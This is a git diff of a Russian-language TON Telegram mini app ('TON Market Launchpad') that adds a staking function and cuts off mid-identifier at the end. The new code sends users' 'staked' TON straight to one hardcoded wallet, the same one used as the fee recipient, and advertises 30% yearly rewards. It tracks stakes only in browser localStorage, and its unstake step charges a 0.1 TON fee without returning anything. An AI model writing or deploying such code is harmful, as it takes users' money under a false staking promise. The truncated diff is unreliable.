@@ -73,7 +73,7 @@ function MinterApp() {
   const [checkingOwner, setCheckingOwner] = useState(false);
   const [loading, setLoading] = useState(false);
 
-  // Инвестиции (бывший presale)
+  // Инвестиции
   const [presaleAmount, setPresaleAmount] = useState('1');
   const [participating, setParticipating] = useState(false);
   const [withdrawing, setWithdrawing] = useState(false);
@@ -224,6 +224,43 @@ function MinterApp() {
       showToast(`Успешно! +5,000 GRAM зачислено за ${stars} ⭐`, 'success');
     }
     setIsStarsOpen(false);
+  };
+
+  // Функция стейкинга
+  const handleStakeAction = async (isDeposit: boolean) => {
+    if (!userAddress) { showToast('Подключите кошелек!', 'error'); return; }
+    const val = parseFloat(stakeInputAmount);
+    if (isNaN(val) || val <= 0) { showToast('Введите сумму', 'error'); return; }
+    if (!isDeposit && val > stakedGramBalance) { showToast('Превышен стейкинг', 'error'); return; }
+
+    if (isDeposit) setStakingLoading(true);
+    else setUnstakeLoading(true);
+
+    try {
+      const commentText = isDeposit ? `STAKE_DEPOSIT | Amount:${val}` : `UNSTAKE | Amount:${val}`;
+      const commentCell = beginCell().storeUint(0, 32).storeStringTail(commentText).endCell();
+      const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 600,
+        messages: [{
+          address: 'UQAIOSFdlxtGH5SMRrFM216SFPj295rUDyQs6-gp_Ab_dm2g',
+          amount: toNano(isDeposit ? val.toString() : '0.1').toString(),
+          payload: commentCell.toBoc().toString('base64'),
+        }],
+      };
+
+      await tonConnectUI.sendTransaction(transaction);
+      setStakedGramBalance((prev) => {
+        const updated = isDeposit ? prev + val : Math.max(0, prev - val);
+        localStorage.setItem(`stake_${tgUser.id}_GRAM`, updated.toString());
+        return updated;
+      });
+      showToast(isDeposit ? 'Успешно в стейкинге!' : 'Запрос на снятие отправлен!', 'success');
+    } catch (err) {
+      showToast('Отменено.', 'error');
+    } finally {
+      setStakingLoading(false);
+      setUnstakeLoading(false);
+    }
   };
 
   const FEE_RECIPIENT_ADDRESS = 'UQAIOSFdlxtGH5SMRrFM216SFPj295rUDyQs6-gp_Ab_dm2g';
@@ -495,92 +532,4 @@ function MinterApp() {
               totalRaised={totalRaised}
               progressPercent={progressPercent}
               presaleAmount={presaleAmount}
-              setPresaleAmount={setPresaleAmount}
-              calculatedGramOutput={calculatedGramOutput}
-              participating={participating}
-              userAddress={userAddress}
-              onWithdrawTokens={handleWithdrawTokens}
-              onCheckSubscription={handleCheckSubscription}
-              onShareRefLink={shareRefLink}
-              onPresaleParticipate={handlePresaleParticipate}
-            />
-          )}
-
-          {activeTab === 'staking' && (
-            <StakingTab
-              timeLeft={timeLeft}
-              stakedGramBalance={stakedGramBalance}
-              stakeInputAmount={stakeInputAmount}
-              setStakeInputAmount={setStakeInputAmount}
-              weeklyReward={((parseFloat(stakeInputAmount || '0') * 0.30) / 52).toFixed(2)}
-              yearlyReward={(parseFloat(stakeInputAmount || '0') * 0.30).toFixed(2)}
-              stakingLoading={stakingLoading}
-              unstakeLoading={unstakeLoading}
-              userAddress={userAddress}
-              onStakeAction={handleStakeAction}
-            />
-          )}
-
-          {activeTab === 'game' && (
-            <GameTab
-              gameScore={gameScore}
-              tapPower={tapPower}
-              energy={energy}
-              maxEnergy={maxEnergy}
-              multitapLevel={multitapLevel}
-              energyLimitLevel={energyLimitLevel}
-              floatingNumbers={floatingNumbers}
-              isTapped={isTapped}
-              farmBalance={farmBalance}
-              onCoinClick={handleCoinClick}
-              onUpgradeMultitap={upgradeMultitap}
-              onUpgradeEnergyLimit={upgradeEnergyLimit}
-              onOpenDaily={() => setIsDailyOpen(true)}
-              onOpenLeaderboard={() => setIsLeaderboardOpen(true)}
-              onOpenStars={() => setIsStarsOpen(true)}
-              onClaimFarm={handleClaimFarm}
-            />
-          )}
-
-        </div>
-      </main>
-
-      <DailyRewardsModal
-        isOpen={isDailyOpen}
-        onClose={() => setIsDailyOpen(false)}
-        userId={tgUser.id}
-        onClaimReward={(amt) => {
-          addGramTokens(amt);
-          showToast(`Вы получили ежедневный бонус +${amt} GRAM! 🎉`, 'success');
-        }}
-      />
-
-      <LeaderboardModal
-        isOpen={isLeaderboardOpen}
-        onClose={() => setIsLeaderboardOpen(false)}
-        userScore={gameScore}
-        userName={tgUser.name}
-      />
-
-      <TelegramStarsModal
-        isOpen={isStarsOpen}
-        onClose={() => setIsStarsOpen(false)}
-        onBuyItem={handleBuyTelegramStars}
-      />
-
-      <footer className="w-full max-w-md text-center pb-1 text-[9px] text-slate-500">
-        TON Market Launchpad • Secure Smart Contracts
-      </footer>
-    </div>
-  );
-}
-
-export default function Home() {
-  const manifestUrl = 'https://ton-mini-app-clean.vercel.app/tonconnect-manifest.json';
-
-  return (
-    <TonConnectUIProvider manifestUrl={manifestUrl}>
-      <MinterApp />
-    </TonConnectUIProvider>
-  );
-}
+              setPres
